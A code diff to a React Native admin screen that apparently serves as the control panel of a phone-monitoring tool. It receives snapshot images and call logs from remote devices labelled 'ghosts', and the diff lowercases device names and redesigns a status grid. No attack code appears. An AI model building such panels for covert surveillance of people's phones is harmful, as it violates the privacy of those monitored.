@@ -85,30 +85,31 @@ const AdminScreen = ({ onLogout, name, onShowGuide }) => {
     });
 
     socket.on('ghost_activity', (payload) => {
+      const lowerName = payload.name.toLowerCase();
       if (payload.type === 'SNAPSHOT') {
         setGhosts(prev => ({
           ...prev,
-          [payload.name]: {
-            ...prev[payload.name],
-            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[payload.name]?.snapshots || [])]
+          [lowerName]: {
+            ...prev[lowerName],
+            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[lowerName]?.snapshots || [])]
           }
         }));
         setLogs(prev => [...prev, { 
           type: 'SYSTEM', 
-          message: `SNAPSHOT RECEIVED FROM ${payload.name}`, 
+          message: `SNAPSHOT RECEIVED FROM ${lowerName}`, 
           timestamp: new Date().toLocaleTimeString() 
         }]);
       } else if (payload.type === 'LOG_SYNC') {
         setGhosts(prev => ({
           ...prev,
-          [payload.name]: {
-            ...prev[payload.name],
+          [lowerName]: {
+            ...prev[lowerName],
             callLogs: payload.data
           }
         }));
         setLogs(prev => [...prev, { 
           type: 'SYSTEM', 
-          message: `TELEMETRY SYNCED FROM ${payload.name}`, 
+          message: `TELEMETRY SYNCED FROM ${lowerName}`, 
           timestamp: new Date().toLocaleTimeString() 
         }]);
       }
@@ -378,20 +379,55 @@ const AdminScreen = ({ onLogout, name, onShowGuide }) => {
 
           {/* TAB CONTENT */}
           <ScrollView style={styles.content} showsVerticalScrollIndicator={false}>
-            {/* Vitals Overview */}
-            <View style={styles.vitalsContainer}>
-              <View style={styles.vitalLeft}>
-                <MaterialCommunityIcons name="cellphone-link" size={24} color="#F8FAFC" style={{marginRight: 10}} />
+            {/* TACTICAL VITALS GRID */}
+            <View style={styles.vitalsGrid}>
+              <View style={[styles.gridCell, { borderLeftWidth: 0 }]}>
+                <View style={styles.cellIconBox}>
+                  <MaterialCommunityIcons name="cellphone-link" size={16} color="#38BDF8" />
+                </View>
                 <View>
-                  <Text style={styles.ghostIdText}>{selectedGhost?.name.toUpperCase()}</Text>
-                  <Text style={styles.vitalSub}>NODE ID • SECURE</Text>
+                  <Text style={styles.cellLabel}>SECURE IDENTITY</Text>
+                  <Text style={styles.cellVal} numberOfLines={1}>{selectedGhost?.name.toUpperCase()}</Text>
                 </View>
               </View>
-              <StatusCard 
-                battery={selectedGhost?.battery || '--%'} 
-                connection={selectedGhost?.status || 'UNKNOWN'}
-                isCharging={selectedGhost?.isCharging} 
-              />
+
+              <View style={styles.gridCell}>
+                <View style={[styles.cellIconBox, { backgroundColor: 'rgba(16, 185, 129, 0.1)' }]}>
+                  <MaterialCommunityIcons 
+                    name={selectedGhost?.isCharging ? "battery-charging" : "battery"} 
+                    size={16} 
+                    color="#10B981" 
+                  />
+                </View>
+                <View>
+                  <Text style={styles.cellLabel}>ENERGY LEVEL</Text>
+                  <Text style={styles.cellVal}>{selectedGhost?.battery || '--%'}</Text>
+                </View>
+              </View>
+
+              <View style={[styles.gridCell, { borderBottomWidth: 0, borderLeftWidth: 0 }]}>
+                <View style={[styles.cellIconBox, { backgroundColor: 'rgba(245, 158, 11, 0.1)' }]}>
+                  <MaterialCommunityIcons name="wifi" size={16} color="#F59E0B" />
+                </View>
+                <View>
+                  <Text style={styles.cellLabel}>UPLINK STATUS</Text>
+                  <Text style={[styles.cellVal, selectedGhost?.status === 'OFFLINE' && { color: '#EF4444' }]}>
+                    {selectedGhost?.status || 'UNKNOWN'}
+                  </Text>
+                </View>
+              </View>
+
+              <View style={[styles.gridCell, { borderBottomWidth: 0 }]}>
+                <View style={[styles.cellIconBox, { backgroundColor: 'rgba(148, 163, 184, 0.1)' }]}>
+                  <MaterialCommunityIcons name="clock-outline" size={16} color="#94A3B8" />
+                </View>
+                <View>
+                  <Text style={styles.cellLabel}>LAST TELEMETRY</Text>
+                  <Text style={styles.cellVal}>
+                    {selectedGhost?.lastSeen ? new Date(selectedGhost.lastSeen).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : 'NEVER'}
+                  </Text>
+                </View>
+              </View>
             </View>
 
             {renderContent()}
@@ -484,10 +520,11 @@ const styles = StyleSheet.create({
 
   // Content
   content: { flex: 1 },
-  vitalsContainer: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', padding: 16, backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
-  vitalLeft: { flexDirection: 'row', alignItems: 'center' },
-  ghostIdText: { color: '#F8FAFC', fontSize: 14, fontWeight: '800', letterSpacing: 1 },
-  vitalSub: { color: '#64748B', fontSize: 10, fontWeight: '600', letterSpacing: 1, marginTop: 2 },
+  vitalsGrid: { flexDirection: 'row', flexWrap: 'wrap', backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
+  gridCell: { width: '50%', flexDirection: 'row', alignItems: 'center', padding: 12, borderLeftWidth: 1, borderBottomWidth: 1, borderColor: '#334155' },
+  cellIconBox: { width: 32, height: 32, borderRadius: 8, backgroundColor: 'rgba(56, 189, 248, 0.1)', justifyContent: 'center', alignItems: 'center', marginRight: 10, borderWidth: 1, borderColor: 'rgba(255, 255, 255, 0.05)' },
+  cellLabel: { color: '#64748B', fontSize: 8, fontWeight: '700', letterSpacing: 0.8 },
+  cellVal: { color: '#F8FAFC', fontSize: 11, fontWeight: '800', marginTop: 1, letterSpacing: 0.5 },
   
   tabSection: { padding: 16 },
   
